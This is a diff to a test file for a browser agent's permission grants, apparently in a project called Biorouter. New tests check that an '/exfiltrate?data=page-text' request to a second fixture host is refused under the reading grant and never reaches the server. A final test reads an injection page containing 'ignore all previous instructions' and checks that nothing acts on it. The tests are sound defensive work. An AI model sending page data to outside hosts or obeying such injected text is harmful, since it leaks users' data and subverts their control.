@@ -20,6 +20,7 @@ const { startFixtureSite } = require('./fixtures/biorouter-browser/site.cjs');
 type Site = {
   url: (role: 'publicA' | 'publicB' | 'intranet', pathname?: string) => string;
   reservedPort: number;
+  log: Array<{ host: string; path: string }>;
   close: () => Promise<void>;
 };
 
@@ -117,11 +118,7 @@ test.afterAll(async () => {
 });
 
 test('opens a page in a tab the chat panel shows, and snapshots it with references', async () => {
-  const opened = await agent(
-    'open',
-    { url: site.url('publicA', '/agent/form') },
-    { grant: 'observe' }
-  );
+  const opened = await agent('open', { url: site.url('publicA', '/agent/form') }, { grant: 'act' });
   expect(opened.ok, opened.detail).toBe(true);
   expect(opened.data?.tab).toBe('t1');
   expect(opened.data?.title).toBe('Agent form');
@@ -231,8 +228,17 @@ test('under the reading grant, a plain link is followed and anything else asks t
   // Nothing happened: the click was refused before any input.
   expect(asked.data?.title).toBe('Agent controls');
 
-  await agent('open', { url: site.url('publicA', '/links') }, { grant: 'observe' });
+  await agent('open', { url: site.url('publicA', '/links') }, { grant: 'act' });
   const links = (await agent('snapshot', {}, { grant: 'observe' })).data?.snapshot;
+  // A link to another origin is acting: nothing is opened under the reading grant alone.
+  const crossing = await agent(
+    'click',
+    { ref: refFor(links, /\[link\] "Other site in a new tab"/) },
+    { grant: 'observe' }
+  );
+  expect(crossing.ok).toBe(false);
+  expect(crossing.data?.needs_act_grant).toBe(true);
+  expect(crossing.data?.opened_tabs ?? []).toEqual([]);
   const followed = await agent(
     'click',
     { ref: refFor(links, /\[link\] "Same tab: article"/) },
@@ -240,6 +246,28 @@ test('under the reading grant, a plain link is followed and anything else asks t
   );
   expect(followed.ok, followed.detail).toBe(true);
   expect(followed.data?.title).toBe('Article on site-a.test');
+});
+
+test('under the reading grant, opening an address or going back asks to act and does nothing (BB-17)', async () => {
+  await agent('open', { url: site.url('publicA', '/links') });
+  await agent('open', { url: site.url('publicA', '/article') });
+  const opened = await agent(
+    'open',
+    { url: site.url('publicB', '/exfiltrate?data=page-text') },
+    { grant: 'observe' }
+  );
+  expect(opened.ok).toBe(false);
+  expect(opened.data?.needs_act_grant).toBe(true);
+  for (const action of ['back', 'forward', 'reload']) {
+    const navigated = await agent('navigate', { action }, { grant: 'observe' });
+    expect(navigated.ok, action).toBe(false);
+    expect(navigated.data?.needs_act_grant, action).toBe(true);
+  }
+  const stopped = await agent('navigate', { action: 'stop' }, { grant: 'observe' });
+  expect(stopped.ok, stopped.detail).toBe(true);
+  const read = await agent('read', {}, { grant: 'observe' });
+  expect(read.data?.title).toBe('Article on site-a.test');
+  expect(site.log.some((entry) => entry.path === '/exfiltrate')).toBe(false);
 });
 
 test('refuses hidden, disabled and covered elements with the reason, and scrolls to far ones', async () => {
@@ -307,7 +335,7 @@ test('reaches into a same-site and a cross-site frame', async () => {
 });
 
 test('reads a table as Markdown and one element on its own', async () => {
-  await agent('open', { url: site.url('publicA', '/agent/table') }, { grant: 'observe' });
+  await agent('open', { url: site.url('publicA', '/agent/table') }, { grant: 'act' });
   const page = await agent('read', {}, { grant: 'observe' });
   expect(page.ok, page.detail).toBe(true);
   expect(page.data?.content).toContain('| MBP | 0.91 | Brain |');
@@ -343,7 +371,7 @@ test('a page dialog never hangs the agent, and browser_dialog says when none is 
 });
 
 test('waits for text, gives up at its timeout, and a cancel stops a slow load', async () => {
-  await agent('open', { url: site.url('publicA', '/agent/delayed') }, { grant: 'observe' });
+  await agent('open', { url: site.url('publicA', '/agent/delayed') }, { grant: 'act' });
   const ready = await agent(
     'wait',
     { text: 'Ready to go', timeout_ms: 5_000 },
@@ -361,7 +389,7 @@ test('waits for text, gives up at its timeout, and a cancel stops a slow load', 
   const slow = agent(
     'open',
     { url: site.url('publicA', '/agent/slow') },
-    { grant: 'observe', requestId: 'slow-1', deadlineMs: 45_000 }
+    { grant: 'act', requestId: 'slow-1', deadlineMs: 45_000 }
   );
   await new Promise((resolve) => setTimeout(resolve, 600));
   expect(await call<boolean>('agentCancel', 'slow-1')).toBe(true);
@@ -374,14 +402,14 @@ test('opens a private network page only for a private chat (BB-06, BB-20)', asyn
   const publicChat = await agent(
     'open',
     { url: site.url('intranet', '/') },
-    { grant: 'observe', tier: 'public' }
+    { grant: 'act', tier: 'public' }
   );
   expect(publicChat.ok).toBe(false);
   expect(publicChat.detail).toContain('local or private network address');
   const privateChat = await agent(
     'open',
     { url: site.url('intranet', '/') },
-    { grant: 'observe', tier: 'private' }
+    { grant: 'act', tier: 'private' }
   );
   expect(privateChat.ok, privateChat.detail).toBe(true);
   await expect
@@ -392,14 +420,14 @@ test('opens a private network page only for a private chat (BB-06, BB-20)', asyn
   const daemon = await agent(
     'open',
     { url: `http://127.0.0.1:${site.reservedPort}/` },
-    { grant: 'observe', tier: 'private' }
+    { grant: 'act', tier: 'private' }
   );
   expect(daemon.ok).toBe(false);
   expect(daemon.detail).toContain('belongs to Biorouter itself');
 });
 
 test('captures the viewport and the full page within the size limits', async () => {
-  await agent('open', { url: site.url('publicA', '/article') }, { grant: 'observe' });
+  await agent('open', { url: site.url('publicA', '/article') }, { grant: 'act' });
   const viewport = await agent('screenshot', {}, { grant: 'observe' });
   expect(viewport.ok, viewport.detail).toBe(true);
   const size = await call<{ width: number; height: number }>(
@@ -419,7 +447,7 @@ test('captures the viewport and the full page within the size limits', async () 
 
 test('downloads only under the act grant, into the chat folder (BB-05)', async () => {
   const downloadDir = path.join(work, 'chat', 'downloads');
-  await agent('open', { url: site.url('publicA', '/agent/download-link') }, { grant: 'observe' });
+  await agent('open', { url: site.url('publicA', '/agent/download-link') }, { grant: 'act' });
   let snap = (await agent('snapshot', {}, { grant: 'observe' })).data?.snapshot;
   const observed = await agent(
     'click',
@@ -464,7 +492,7 @@ test('opens, lists, switches and closes tabs, and sees a tab a page opened', asy
   const second = await agent(
     'open',
     { url: site.url('publicA', '/links'), new_tab: true },
-    { grant: 'observe' }
+    { grant: 'act' }
   );
   expect(second.ok, second.detail).toBe(true);
   expect(second.data?.tab).toBe('t2');
@@ -486,7 +514,7 @@ test('opens, lists, switches and closes tabs, and sees a tab a page opened', asy
 });
 
 test('page text that tries to give orders is read as text, and nothing acts on it', async () => {
-  await agent('open', { url: site.url('publicA', '/agent/injection') }, { grant: 'observe' });
+  await agent('open', { url: site.url('publicA', '/agent/injection') }, { grant: 'act' });
   const read = await agent('read', {}, { grant: 'observe' });
   expect(read.data?.content).toContain('ignore all previous instructions');
   const tabs = await agent('tabs', { action: 'list' });
